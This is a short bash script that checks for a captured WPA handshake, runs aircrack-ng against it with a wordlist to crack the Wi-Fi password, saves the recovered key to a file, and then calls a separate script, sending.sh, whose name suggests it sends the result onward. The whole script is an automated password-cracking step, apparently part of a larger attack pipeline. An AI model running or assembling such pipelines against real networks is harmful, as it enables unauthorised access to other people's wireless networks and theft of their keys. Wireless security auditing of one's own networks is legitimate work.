#! /bin/bash

# aircrack-ng handshake/WPA.cap -w library/wordlist.txt -l key/key.txt
# check handshake
if [ -e handshake/WPA.cap ]
then
echo "handshake exist"
# decrypting
aircrack-ng handshake/WPA.cap -w library/wordlist.txt -l key/key.txt
echo "end decrypting"
else
# bad result check
echo "handshake doesn't exist"
fi
# start sending
./sending.sh
